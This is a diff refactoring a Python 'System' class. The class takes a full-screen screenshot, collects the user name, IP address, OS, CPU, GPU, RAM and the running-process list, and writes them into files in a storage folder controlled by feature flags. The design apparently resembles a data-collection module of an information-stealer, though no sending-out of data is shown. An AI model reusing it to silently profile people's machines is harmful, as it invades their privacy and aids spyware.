@@ -11,12 +11,8 @@ class System:
 
     def __init__(self, *args):
 
-        self.storage_path = args[0]
-        self.storage_folder = args[1]
-        self.folder = args[2]
-
-        self.statuses = args[3]
-        self.errors = args[4]
+        for index, variable in enumerate(["storage_path", "storage_folder", "folder", "statuses", "errors"]):
+            self.__dict__.update({variable: args[index]})
 
     def __create_folder(self):
 
@@ -26,6 +22,7 @@ class System:
     def __create_screen(self):
 
         if self.statuses[0] is True:
+
             with mss() as screen:
                 screen.shot(mon=-1, output=f"{self.storage_path}{self.storage_folder}{self.folder}/Screenshot.png")
 
@@ -39,7 +36,7 @@ class System:
             cpu_info = computer.Win32_Processor()[0]
             gpu_info = computer.Win32_VideoController()[0]
 
-            info = [
+            info = (
                 f"User: {getuser()}\n",
                 f"IP: {gethostbyname(gethostname())}\n",
                 f"OS Name: {os_info.Name.split('|')[0]}\n",
@@ -47,11 +44,9 @@ class System:
                 f"CPU: {cpu_info.Name}\n",
                 f"GPU: {gpu_info.Name}\n",
                 f"RAM: {round(float(os_info.TotalVisibleMemorySize) / 1048576)} GB\n"
-            ]
+            )
 
-            with open(f"{self.storage_path}{self.storage_folder}{self.folder}/System.txt", "a", encoding="utf-8") as system:
-
-                system.write(f"[System info]\n")
+            with open(f"{self.storage_path}{self.storage_folder}{self.folder}/Configuration.txt", "a", encoding="utf-8") as system:
 
                 for item in info:
                     system.write(item)
@@ -62,9 +57,9 @@ class System:
 
         if self.statuses[2] is True:
 
-            with open(f"{self.storage_path}{self.storage_folder}{self.folder}/System.txt", "a", encoding="utf-8") as processes:
+            with open(f"{self.storage_path}{self.storage_folder}{self.folder}/Processes.txt", "a", encoding="utf-8") as processes:
 
-                processes.write(f"\n[Startup time] [Status] [CPU %] [RAM %] [Name]")
+                processes.write(f"[Startup time] [Status] [CPU %] [RAM %] [Name]\n")
 
                 for process in process_iter():
                     processes.write(f"\n[{datetime.fromtimestamp(process.create_time())}] [{process.status()}] [{process.cpu_percent()}] [{process.memory_percent():.4f}] {process.name()}")
